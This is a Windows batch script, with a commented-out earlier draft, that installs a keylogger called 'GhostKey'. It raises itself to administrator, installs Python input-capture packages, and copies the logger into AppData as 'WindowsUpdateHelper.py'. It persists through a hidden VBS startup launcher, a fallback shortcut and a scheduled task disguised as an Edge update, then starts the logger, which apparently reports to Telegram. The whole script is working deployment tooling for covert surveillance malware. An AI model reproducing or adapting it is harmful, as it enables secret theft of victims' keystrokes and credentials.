@REM @echo off
@REM title GhostKey Installer
@REM cd /d "%~dp0"

@REM echo ====================================
@REM echo    GhostKey - One Click Installer
@REM echo ====================================
@REM echo.

@REM :: Check if ghostkey.py exists
@REM if not exist "ghostkey.py" (
@REM     echo [ERROR] ghostkey.py not found in this folder!
@REM     echo Please place ghostkey.py next to this batch file.
@REM     pause
@REM     exit /b 1
@REM )

@REM :: Step 1: Install dependencies
@REM echo [1/4] Installing Python packages...
@REM pip install pynput pywin32 requests
@REM echo Done.
@REM echo.

@REM :: Step 2: Copy to APPDATA
@REM echo [2/4] Copying files...
@REM copy /Y "ghostkey.py" "%APPDATA%\Microsoft\Windows\WindowsUpdateHelper.py"
@REM echo Done.
@REM echo.

@REM :: Step 3: Create startup shortcut
@REM echo [3/4] Creating startup entry...
@REM set TARGET=%APPDATA%\Microsoft\Windows\WindowsUpdateHelper.py
@REM set SHORTCUT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateHelper.lnk

@REM powershell -Command ^
@REM "$ws = New-Object -ComObject WScript.Shell; " ^
@REM "$sc = $ws.CreateShortcut('%SHORTCUT%'); " ^
@REM "$sc.TargetPath = 'python.exe'; " ^
@REM "$sc.Arguments = '\"%TARGET%\"'; " ^
@REM "$sc.WindowStyle = 7; " ^
@REM "$sc.Description = 'Windows Update Helper'; " ^
@REM "$sc.Save()"
@REM echo Done.
@REM echo.

@REM :: Step 4: Launch
@REM echo [4/4] Starting keylogger...
@REM start /b python "%APPDATA%\Microsoft\Windows\WindowsUpdateHelper.py"
@REM echo Done.
@REM echo.

@REM echo ====================================
@REM echo  Installation Complete!
@REM echo ====================================
@REM echo.
@REM echo Keylogger is now running in background.
@REM echo Check Telegram for confirmation.
@REM echo.
@REM echo It will auto-start on next boot.
@REM echo.
@REM pause


@echo off
title GhostKey Installer
cd /d "%~dp0"

:: Check for admin rights (needed for some operations)
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] Not running as Administrator.
    echo [!] Restarting with admin rights...
    powershell start-process "%~f0" -verb runas
    exit /b
)

echo ====================================
echo    GhostKey - One Click Installer
echo ====================================
echo.

:: Check if ghostkey.py exists
if not exist "ghostkey.py" (
    echo [ERROR] ghostkey.py not found in this folder!
    echo Current folder: %CD%
    echo Please place ghostkey.py next to this batch file.
    pause
    exit /b 1
)

:: Step 1: Install dependencies
echo [1/4] Installing Python packages...
pip install pynput pywin32 requests 2>&1 | findstr /v "already satisfied"
if %errorLevel% neq 0 (
    echo [!] pip install had issues, but continuing...
)
echo Done.
echo.

:: Step 2: Copy to APPDATA
echo [2/4] Copying files...
if not exist "%APPDATA%\Microsoft\Windows" mkdir "%APPDATA%\Microsoft\Windows"
copy /Y "ghostkey.py" "%APPDATA%\Microsoft\Windows\WindowsUpdateHelper.py"
if %errorLevel% neq 0 (
    echo [ERROR] Failed to copy file!
    pause
    exit /b 1
)
echo Done.
echo.

:: Step 3: Create startup shortcut using VBS instead (more reliable)
echo [3/4] Creating startup entry...

:: First, remove old shortcut if exists
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateHelper.lnk" >nul 2>&1
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateHelper.vbs" >nul 2>&1

:: Create VBS launcher - this is more reliable than shortcuts
set "VBS_FILE=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateHelper.vbs"
set "PY_FILE=%APPDATA%\Microsoft\Windows\WindowsUpdateHelper.py"

:: Write VBS file
(
echo Dim objShell
echo Set objShell = CreateObject^("Wscript.Shell"^)
echo objShell.Run "python.exe """ ^& "%PY_FILE%" ^& """", 0, False
echo Set objShell = Nothing
) > "%VBS_FILE%"

if exist "%VBS_FILE%" (
    echo   Created VBS launcher successfully!
) else (
    echo   [!] VBS creation failed, trying shortcut method...
    powershell -Command ^
    "$ws = New-Object -ComObject WScript.Shell; " ^
    "$sc = $ws.CreateShortcut('%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateHelper.lnk'); " ^
    "$sc.TargetPath = 'python.exe'; " ^
    "$sc.Arguments = '\"%PY_FILE%\"'; " ^
    "$sc.WindowStyle = 7; " ^
    "$sc.Save(); echo 'Shortcut created'"
)
echo Done.
echo.

:: Step 4: Also create scheduled task as backup (most reliable for boot)
echo [4/4] Creating backup scheduled task...
set "TASK_NAME=MicrosoftEdgeUpdate_%RANDOM%"
schtasks /create /tn "%TASK_NAME%" /tr "python.exe \"%PY_FILE%\"" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
if %errorLevel% equ 0 (
    echo   Scheduled task created successfully!
) else (
    echo   [!] Could not create scheduled task (non-admin mode?)
)
echo Done.
echo.

:: Step 5: Launch now
echo [5/5] Starting keylogger now...
start /b python "%PY_FILE%"

:: Wait and check if it's running
timeout /t 3 /nobreak >nul
tasklist /fi "imagename eq python.exe" 2>nul | find /i "python.exe" >nul
if %errorLevel% equ 0 (
    echo [+] Python is running! Keylogger should be active.
) else (
    echo [!] Warning: Could not verify python is running.
    echo [!] Try running manually: python "%PY_FILE%"
)

echo.
echo ====================================
echo  Installation Complete!
echo ====================================
echo.
echo Summary:
echo   - File: %PY_FILE%
echo   - Startup: %VBS_FILE%
echo   - Task: %TASK_NAME%
echo.
echo Keylogger is now running in background.
echo Check Telegram for "Agent online" message.
echo.
echo It will auto-start on next boot.
echo.
echo Note: If WiFi is not connected at boot, the keylogger
echo will wait silently until internet is available.
echo.
pause